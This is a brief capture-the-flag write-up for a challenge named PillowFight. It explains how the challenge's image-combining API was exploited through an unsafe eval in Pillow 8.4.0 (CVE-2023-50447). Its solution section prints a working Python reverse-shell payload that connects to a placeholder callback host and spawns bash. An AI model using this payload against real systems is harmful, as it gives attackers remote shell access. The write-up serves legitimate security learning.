# PillowFight

## Description

<small>Author: @HuskyHacks</small><br><br>PillowFight uses <i><b>advanced AI/MLRegressionLearning* </i></b> to combine two images of your choosing <br><br>
<small> *note to investors this is not techically true at the moment we're using a python library but please give us money and we'll deliver it we promise. </small> <br><br> <b>Press the <code>Start</code> button on the top-right to begin this challenge.</b>


## Solution

This was a live service that utilized Pillow version 8.4.0 for combining images. It exposed a simple API that let the user exploit a known vulnerability in an unsafe `eval` that Pillow has in its library.

This writeup has some more information about the vulnerability:
https://duartecsantos.github.io/2024-01-02-CVE-2023-50447/


They had some interactive API documents set up, so it was really straightforward to exploit.

![pillow_fight_1.png](/images/pillow_fight_1.png)

Just add a reverse shell as the expression to evaluate: 
```
exec('import os,pty,socket;s=socket.socket();s.connect(("<CALLBACK_IP>",<CALLBACK_PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")')
```

